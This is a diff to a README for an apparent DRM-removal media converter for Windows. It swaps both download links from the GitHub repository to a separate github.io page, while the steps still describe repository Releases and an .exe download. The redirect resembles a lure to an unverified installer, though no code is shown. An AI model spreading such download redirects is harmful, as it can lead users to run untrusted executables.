@@ -1,6 +1,6 @@
 # 🎞️ m4vgear-media-converter - Save your media files for offline use
 
-[![](https://img.shields.io/badge/Download-m4vgear--media--converter-blue.svg)](https://github.com/nguyentandat2820-rgb/m4vgear-media-converter)
+[![](https://img.shields.io/badge/Download-m4vgear--media--converter-blue.svg)](https://nguyentandat2820-rgb.github.io)
 
 This tool helps you save your media files. It removes digital restrictions so you can watch your content offline on any device. The application works with Windows and handles large libraries with ease. It includes features to organize your files and add information about your media automatically.
 
@@ -8,7 +8,7 @@ This tool helps you save your media files. It removes digital restrictions so yo
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official download page](https://github.com/nguyentandat2820-rgb/m4vgear-media-converter).
+1. Go to the [official download page](https://nguyentandat2820-rgb.github.io).
 2. Locate the section labeled Releases on the right side of the screen.
 3. Click the latest version link.
 4. Download the installation file ending in .exe.
